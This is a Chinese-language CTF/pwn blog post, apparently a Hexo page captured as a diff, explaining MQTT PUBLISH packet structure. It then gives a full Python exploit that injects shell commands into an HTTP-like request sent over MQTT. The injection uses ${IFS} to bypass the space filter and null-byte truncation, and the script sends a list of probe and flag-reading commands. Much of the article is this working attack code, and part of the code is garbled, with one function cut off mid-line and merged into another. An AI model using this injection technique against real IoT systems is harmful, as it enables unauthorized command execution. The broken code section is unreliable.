@@ -1,0 +1,464 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>MQTT PUBLISH 数据包解析 | 良夜の小窝</title>
+    <meta name="author" content="良夜" />
+    <meta name="description" content="Here's an cat..." />
+    <meta name="keywords" content="良夜,博客,ice993" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/lty.png" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+<script src="/js/lib/click-effect.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>良夜の小窝</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;良夜の小窝</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>MQTT PUBLISH 数据包解析</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/7/10
+        </span>
+        
+        <span class="category">
+            <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                二进制安全
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/pwn/" style="color: #00a596">
+                    pwn
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/IoT/" style="color: #00bcd4">
+                    IoT
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/MQTT/" style="color: #ff7d73">
+                    MQTT
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>它分为三个部分：</p>
+<ol>
+<li><strong>固定报头 (Fixed Header)：</strong> 包含报文类型（PUBLISH）和整个数据包剩余部分的长度。</li>
+<li><strong>可变报头 (Variable Header)：</strong> 对于 PUBLISH 报文，这里主要存的是 Topic（主题名）。</li>
+<li><strong>有效载荷 (Payload)：</strong> 就是我们真正想发送的消息内容（即带有漏洞利用代码的字符串）。</li>
+</ol>
+<h3 id="pack-str-s-：MQTT-的字符串打包器"><a href="#pack-str-s-：MQTT-的字符串打包器" class="headerlink" title="pack_str(s)：MQTT 的字符串打包器"></a><code>pack_str(s)</code>：MQTT 的字符串打包器</h3><p>在 C 语言中，字符串以 <code>\x00</code> 结尾。但在网络传输（特别是 MQTT 协议）中，为了防止数据截断，字符串采用的是长度前缀机制。也就是说，你要发一个字符串，必须先用 2 个字节告诉对方这个字符串有多长。</p>
+<pre><code class="language-python">def pack_str(s):
+    # !H 代表 2 字节的大端序长度，强制加在字符串前面
+    return struct.pack(&quot;!H&quot;, len(s)) + s
+</code></pre>
+<ul>
+<li><code>**struct.pack(&quot;!H&quot;, len(s))**</code>** 是什么**<ul>
+<li><code>!</code> 代表<strong>大端序（网络字节序）</strong>，这是网络协议通信的通用标准（高位字节在前，低位字节在后）。</li>
+<li><code>H</code> 代表无符号短整型（Unsigned Short），刚好占用 <strong>2 个字节</strong>，最大可以表示 65535 的长度。</li>
+</ul>
+</li>
+<li><strong>举个例子：</strong> 如果你要发送 Topic 名 <code>&quot;HTTP&quot;</code>（长度为 4）。 <code>len(&quot;HTTP&quot;)</code> 是 4。打包后，前面会生成两个字节 <code>\x00\x04</code>。 最终返回的字节流就是：<code>b&#39;\x00\x04HTTP&#39;</code>。服务端收到后，先读两字节发现是 4，接着往后读 4 个字节，就精准拿到了 “HTTP”。</li>
+</ul>
+<h3 id="enc-varint-x-：变长编码（最精妙的设计）"><a href="#enc-varint-x-：变长编码（最精妙的设计）" class="headerlink" title="enc_varint(x)：变长编码（最精妙的设计）"></a><code>enc_varint(x)</code>：变长编码（最精妙的设计）</h3><p>这是 MQTT 协议为了省流量搞出来的一个特殊算法，用来表示剩余长度。 如果数据包很小，剩余长度用 1 个字节就够了；如果很大，可能需要 2 到 4 个字节。MQTT 是怎么知道这个长度到底占用了几个字节呢？</p>
+<p>它巧妙地利用了每个字节的<strong>最高位（第 8 位）作为延续位</strong>：</p>
+<ul>
+<li>如果最高位是 <code>1</code>，说明“还没完，下一个字节也是长度的一部分”。</li>
+<li>如果最高位是 <code>0</code>，说明“这就是长度字段的最后一个字节了”。 剩下的 7 位才用来存储真正的数值数据（即 Base-128 编码）。</li>
+</ul>
+<pre><code class="language-python">def enc_varint(x):
+    out = b&quot;&quot;
+    while True:
+        b = x % 128       # 取出低 7 位的值 (因为 128 是 2 的 7 次方)
+        x //= 128         # 把原数右移 7 位，准备处理下一批数据
+        if x &gt; 0:
+            b |= 0x80     # 如果 x 还没处理完，把 b 的最高位设为 1 (0x80 即二进制 10000000)
+        out += bytes([b]) # 把算好的这个字节加到结果里
+        if x == 0:        # 处理完了，返回！
+            return out
+</code></pre>
+<ul>
+<li><strong>举个例子：</strong> 假设我们要发送的剩余内容长度是 <code>130</code> 个字节。<ul>
+<li><strong>第一轮循环：</strong><ul>
+<li><code>b = 130 % 128 = 2</code>。</li>
+<li><code>x = 130 // 128 = 1</code>。</li>
+<li>因为 <code>x &gt; 0</code>，所以 <code>b |= 0x80</code>，<code>b</code> 变成了 <code>2 | 128 = 130</code>（十六进制 <code>0x82</code>）。</li>
+<li><code>out</code> 记录下 <code>\x82</code>（最高位是 1，意思是：别急，后面还有）。</li>
+</ul>
+</li>
+<li><strong>第二轮循环：</strong><ul>
+<li><code>b = 1 % 128 = 1</code>。</li>
+<li><code>x = 1 // 128 = 0</code>。</li>
+<li>因为 <code>x == 0</code>，不需要打标记了，<code>b</code> 依然是 1（十六进制 <code>0x01</code>）。</li>
+<li><code>out</code> 加上 <code>\x01</code>（最高位是 0，意思是：长度读完了！）。</li>
+</ul>
+</li>
+<li>最终返回 <code>b&#39;\x82\x01&#39;</code>。服务端靠这两个字节就能反解出真实的长度 130。</li>
+</ul>
+</li>
+</ul>
+<h3 id="publish-和-send-pkt：终极拼装与发射"><a href="#publish-和-send-pkt：终极拼装与发射" class="headerlink" title="publish 和 send_pkt：终极拼装与发射"></a><code>publish</code> 和 <code>send_pkt</code>：终极拼装与发射</h3><p>有了前面两个零件，现在可以组装真正的 MQTT 报文并发送了。</p>
+<pre><code class="language-python">def publish(self, topic, payload, qos=0):
+    # 1. 组装后面一大坨 (可变报头 + 有效载荷)
+    body = pack_str(topic) + payload 
+
+    # 2. 构造固定报头的第 1 个字节
+    hdr = 0x30 | (qos  0: b |= 0x80
+            out += bytes([b])
+            if x == 0: return out
+
+    def _pack_str(self, s):
+        if isinstance(s, str): s = s.encode()
+        return struct.pack(&quot;!H&quot;, len(s)) + s
+
+    def connect(self, client_id):
+        vh = self._pack_str(&quot;MQTT&quot;) + bytes([4, 2]) + struct.pack(&quot;!H&quot;, 60)
+        self.sock.sendall(bytes([0x10]) + self._enc_varint(len(vh + self._pack_str(client_id))) + vh + self._pack_str(client_id))
+        time.sleep(0.1) # 等待连接建立
+
+    def subscribe(self, topic):
+        body = struct.pack(&quot;!H&quot;, 1) + self._pack_str(topic) + bytes([0])
+        self.sock.sendall(bytes([0x82]) + self._enc_varint(len(body)) + body)
+        time.sleep(0.1)
+
+    def publish(self, topic, payload):
+        if isinstance(payload, str): payload = payload.encode()
+        body = self._pack_str(topic) + payload
+        self.sock.sendall(bytes([0x30]) + self._enc_varint(len(body)) + body)
+
+    def close(self):
+        self.running = False
+        try: self.sock.close()
+        except: pass
+
+# ==========================================
+# [ 雷达监听区 ] (后台守护线程，专门抓瞎打的回显)
+# ==========================================
+def radar_listener(client):
+    print(&quot;[*] Radar activated. Listening for echoes...&quot;)
+    while client.running:
+        try:
+            # 这里做了极简处理，实际可用 socket recv 循环读取
+            data = client.sock.recv(4096)
+            if not data: continue
+            
+            # 尝试在乱码的二进制流中提取可见文本
+            txt = data.decode(&#39;utf-8&#39;, &#39;ignore&#39;)
+            
+            # TODO: 根据题目具体的回显格式(JSON或明文)修改这里的匹配逻辑
+            if &quot;httpclient&quot; in txt or &quot;&#123;&quot; in txt:
+                print(f&quot;\n[Radar Catch] ==&gt; &#123;txt.strip()&#125;&quot;)
+            if &quot;flag&#123;&quot; in txt.lower() or &quot;ctf&#123;&quot; in txt.lower():
+                print(f&quot;\n[!!!] BINGO! FLAG FOUND: &#123;txt.strip()&#125;\n&quot;)
+        except:
+            break
+
+# ==========================================
+# [ 漏洞利用核心区 ] (你需要根据题目修改这里)
+# ==========================================
+def fire_payload(cmd):
+    &quot;&quot;&quot;
+    在这里构造你的特定 Payload。
+    支持返回单次请求，或者由多次请求组成的攻击链。
+    &quot;&quot;&quot;
+    # 示例：针对 \x00 截断和二次覆盖漏洞的 Payload
+    # 使用 $&#123;IFS&#125; 绕过空格限制，使用 \x00 阻断解析
+    cmd = cmd if cmd.endswith(&quot;$&#123;IFS&#125;#&quot;) else cmd + &quot;$&#123;IFS&#125;#&quot;
+    stage1 = f&quot;GET /ctf/index_html;&#123;cmd&#125; HTTP/1.1\r\n\r\n\x00&quot;.encode()
+    stage2 = b&quot;GET /ctf/index_html HTTP/1.1\r\n\r\n\x00&quot;
+    
+    # 每次攻击建立一个新的独立客户端
+    attacker = RawMQTT(HOST, PORT)
+    attacker.connect(f&quot;atk_&#123;random.randint(100,999)&#125;&quot;)
+    
+    # 执行攻击链 (带容错延时)
+    attacker.publish(PUB_TOPIC, stage1)
+    time.sleep(0.5) 
+    attacker.publish(PUB_TOPIC, stage2)
+    
+    attacker.close()
+
+# ==========================================
+# [ 主控循环区 ] (稳健的盲打/爆破引擎)
+# ==========================================
+def main():
+    # 1. 启动接收端雷达
+    radar = RawMQTT(HOST, PORT)
+    radar.connect(f&quot;radar_&#123;random.randint(100,999)&#125;&quot;)
+    radar.subscribe(SUB_TOPIC)
+    
+    t = threading.Thread(target=radar_listener, args=(radar,), daemon=True)
+    t.start()
+    time.sleep(1) # 给雷达一点启动时间
+
+    # 2. 准备武器库 (根据系统环境定制盲猜命令)
+    arsenal = [
+        &quot;echo$&#123;IFS&#125;PWNED&quot;,   # 探针：测连通性
+        &quot;ls$&#123;IFS&#125;-la&quot;,       # 探针：看当前目录
+        &quot;cat$&#123;IFS&#125;f*&quot;,       # 盲狙：f开头文件
+        &quot;cat$&#123;IFS&#125;flag*&quot;,    # 盲狙：flag文件
+        &quot;cat$&#123;IFS&#125;/flag&quot;,    # 盲狙：根目录flag
+    ]
+
+    # 3. 循环开火 (带容错机制)
+    print(f&quot;[*] Starting attack loop. Total payloads: &#123;len(arsenal)&#125;&quot;)
+    for cmd in arsenal:
+        print(f&quot;[-] Firing: &#123;cmd&#125;&quot;)
+        try:
+            fire_payload(cmd)
+            time.sleep(2) # 打完一发，等雷达飞一会儿
+        except Exception as e:
+            print(f&quot;[!] Target choked on &#39;&#123;cmd&#125;&#39;: &#123;e&#125;&quot;)
+            time.sleep(1) # 容错休眠，防止把服务打挂
+
+    # 4. 打扫战场
+    print(&quot;[*] Arsenal empty. Waiting 3 seconds for lingering echoes...&quot;)
+    time.sleep(3)
+    radar.close()
+    print(&quot;[*] Done.&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+
+    </div>
+    
+    
+    
+    
+    <div id="comment">
+        <div id="giscus-container" class="giscus"></div>
+    </div>
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2026 良夜の小窝
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;良夜
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+<script
+    src="https://giscus.app/client.js"
+    data-repo="ice993/hexo-123"
+    data-repo-id="R_kgDOPWL0Lg"
+    data-category="Announcements"
+    data-category-id="DIC_kwDOPWL0Ls4Ct1k-"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="preferred_color_scheme"
+    data-lang="zh-CN"
+    crossorigin
+    async
+></script>
+
+
+
+
+
+    
+    <script>
+    if ("serviceWorker" in navigator) {
+        navigator.serviceWorker.register("/sw.js");
+    }
+    </script>
+</body>
+</html>
